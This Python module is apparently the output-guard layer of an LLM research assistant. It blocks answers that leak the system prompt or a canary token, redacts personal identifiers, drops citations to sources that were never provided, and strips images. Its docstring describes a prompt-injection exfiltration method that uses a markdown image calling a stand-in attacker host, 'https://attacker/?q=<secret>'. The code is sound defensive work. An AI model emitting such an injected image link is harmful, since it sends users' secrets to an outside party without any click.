"""Layer 4: output guard. Runs on every answer before it leaves the server.

- Prompt-leak detection: the per-request canary, or verbatim system-prompt fragments.
- PII redaction: emails, phone numbers (Indian and international), Aadhaar-like numbers
  (Verhoeff checksum), PAN-like IDs, card-like numbers (Luhn) — checksums keep ordinary
  numbers in research text from being redacted.
- Citation verification: [N] markers must refer to a source that was actually provided.
- Image stripping: markdown images make the browser fetch a URL as soon as the answer
  renders, so an injected ![](https://attacker/?q=<secret>) is a zero-click exfiltration
  channel. Answers never need images, so they're removed.
"""

import re
import time
from dataclasses import dataclass, field

from security.prompt import LEAK_FINGERPRINTS, PromptBundle


@dataclass
class OutputResult:
    text: str
    blocked: bool = False
    leak_reasons: list[str] = field(default_factory=list)
    pii_redactions: dict[str, int] = field(default_factory=dict)
    invalid_citations: list[int] = field(default_factory=list)
    removed_images: int = 0
    latency_ms: float = 0.0


# --- prompt leak ----------------------------------------------------------------------


def _squash(text: str) -> str:
    return re.sub(r"[\s\-_.]+", "", text).lower()


def detect_leak(text: str, bundle: PromptBundle) -> list[str]:
    reasons = []
    if bundle.canary:
        token = bundle.canary.split("-", 1)[1]
        if token.lower() in _squash(text) or _squash(bundle.canary) in _squash(text):
            reasons.append("canary")
    normalized = " ".join(text.lower().split())
    if any(fp in normalized for fp in LEAK_FINGERPRINTS):
        reasons.append("system_prompt_text")
    return reasons


# --- PII -----------------------------------------------------------------------------

_VERHOEFF_D = [
    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [1, 2, 3, 4, 0, 6, 7, 8, 9, 5], [2, 3, 4, 0, 1, 7, 8, 9, 5, 6],
    [3, 4, 0, 1, 2, 8, 9, 5, 6, 7], [4, 0, 1, 2, 3, 9, 5, 6, 7, 8], [5, 9, 8, 7, 6, 0, 4, 3, 2, 1],
    [6, 5, 9, 8, 7, 1, 0, 4, 3, 2], [7, 6, 5, 9, 8, 2, 1, 0, 4, 3], [8, 7, 6, 5, 9, 3, 2, 1, 0, 4],
    [9, 8, 7, 6, 5, 4, 3, 2, 1, 0],
]
_VERHOEFF_P = [
    [0, 1, 2, 3, 4, 5, 6, 7, 8, 9], [1, 5, 7, 6, 2, 8, 3, 0, 9, 4], [5, 8, 0, 3, 7, 9, 6, 1, 4, 2],
    [8, 9, 1, 6, 0, 4, 3, 5, 2, 7], [9, 4, 5, 3, 1, 2, 6, 8, 7, 0], [4, 2, 8, 6, 5, 7, 3, 9, 0, 1],
    [2, 7, 9, 3, 8, 0, 6, 4, 1, 5], [7, 0, 4, 6, 9, 1, 3, 2, 5, 8],
]


def verhoeff_valid(digits: str) -> bool:
    c = 0
    for i, ch in enumerate(reversed(digits)):
        c = _VERHOEFF_D[c][_VERHOEFF_P[i % 8][int(ch)]]
    return c == 0


def luhn_valid(digits: str) -> bool:
    total = 0
    for i, ch in enumerate(reversed(digits)):
        d = int(ch)
        if i % 2 == 1:
            d = d * 2 - 9 if d > 4 else d * 2
        total += d
    return total % 10 == 0


_EMAIL = re.compile(r"\b[\w.+-]+@[\w-]+(?:\.[\w-]+)+\b")
_CARD = re.compile(r"\b(?:\d[ -]?){12,18}\d\b")
_AADHAAR = re.compile(r"\b[2-9]\d{3}[ -]?\d{4}[ -]?\d{4}\b")
_PAN = re.compile(r"\b[A-Z]{5}\d{4}[A-Z]\b")
_PHONE_IN = re.compile(r"(?<![\d+])(?:\+91[ -]?|0)?[6-9]\d{4}[ -]?\d{5}\b")
_PHONE_INTL = re.compile(r"(?<![\w+])\+(?!91)\d{1,3}[ -]?\(?\d{1,4}\)?(?:[ -]?\d{2,4}){2,4}\b")


def _digits(s: str) -> str:
    return re.sub(r"\D", "", s)


def redact_pii(text: str) -> tuple[str, dict[str, int]]:
    counts: dict[str, int] = {}

    def sub(pattern: re.Pattern, label: str, validate=None):
        nonlocal text

        def repl(m: re.Match) -> str:
            if validate and not validate(m.group(0)):
                return m.group(0)
            counts[label] = counts.get(label, 0) + 1
            return f"[REDACTED {label.upper()}]"

        text = pattern.sub(repl, text)

    # Most specific first, so a card number isn't half-eaten by the phone pattern.
    sub(_EMAIL, "email")
    sub(_CARD, "card", lambda s: 13 <= len(_digits(s)) <= 19 and luhn_valid(_digits(s)))
    sub(_AADHAAR, "aadhaar", lambda s: verhoeff_valid(_digits(s)))
    sub(_PAN, "pan")
    sub(_PHONE_IN, "phone")
    sub(_PHONE_INTL, "phone")
    return text, counts


# --- citations & images ---------------------------------------------------------------

_CITATION_GROUP = re.compile(r"\[(\s*\d+\s*(?:,\s*\d+\s*)*)\]")
_MARKDOWN_IMAGE = re.compile(r"!\[[^\]]*\]\([^)]*\)")
_HTML_IMAGE = re.compile(r"<img\b[^>]*>", re.IGNORECASE)


def verify_citations(text: str, source_count: int) -> tuple[str, list[int]]:
    invalid: list[int] = []

    def repl(m: re.Match) -> str:
        numbers = [int(n) for n in m.group(1).split(",")]
        valid = [n for n in numbers if 1 <= n <= source_count]
        invalid.extend(n for n in numbers if n not in valid)
        return f"[{', '.join(map(str, valid))}]" if valid else ""

    return _CITATION_GROUP.sub(repl, text), sorted(set(invalid))


def strip_images(text: str) -> tuple[str, int]:
    count = len(_MARKDOWN_IMAGE.findall(text)) + len(_HTML_IMAGE.findall(text))
    text = _MARKDOWN_IMAGE.sub("[image removed]", text)
    return _HTML_IMAGE.sub("[image removed]", text), count


def scan_output(text: str, bundle: PromptBundle, pii_redaction: bool = True) -> OutputResult:
    started = time.perf_counter()
    leak = detect_leak(text, bundle)
    if leak:
        return OutputResult(text="", blocked=True, leak_reasons=leak, latency_ms=(time.perf_counter() - started) * 1000)
    text, removed_images = strip_images(text)
    text, invalid = verify_citations(text, bundle.source_count)
    counts: dict[str, int] = {}
    if pii_redaction:
        text, counts = redact_pii(text)
    return OutputResult(
        text=text,
        pii_redactions=counts,
        invalid_citations=invalid,
        removed_images=removed_images,
        latency_ms=(time.perf_counter() - started) * 1000,
    )
